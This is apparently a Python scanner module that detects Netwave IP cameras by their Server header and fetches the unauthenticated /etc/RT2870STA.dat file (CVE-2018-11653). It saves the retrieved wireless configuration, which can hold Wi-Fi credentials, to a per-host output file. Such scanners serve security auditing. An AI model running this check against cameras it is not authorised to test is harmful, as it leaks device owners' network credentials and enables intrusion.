from .scan import Scan
import aiohttp
import traceback

class Netwave(Scan):
    def preCheck(self):
        return True if "Server" in self.ping.headers.keys() and self.ping.headers["Server"] == "Netwave IP Camera" else False

    async def scan(self, session : aiohttp.ClientSession):
        vulns = []
        data = {}

        try:
            async with session.get(**{"url":str(self.ping.url)+"/etc/RT2870STA.dat"}, **self.request_args, timeout=2) as resp:
                if resp.status == 200:
                    text = (await resp.text())
                    if "[Default]" in text:
                        vulns.append("CVE-2018-11653")
                        data["CVE-2018-11653"] = {"data": text}
                        self.mkdir(["netwave", "CVE-2018-11653"])
                        with open("scan-outputs/netwave/CVE-2018-11653/"+self.ping.host+".ini", "w") as fp:
                            fp.write(text)
        except Exception as e:
            pass

        return vulns, data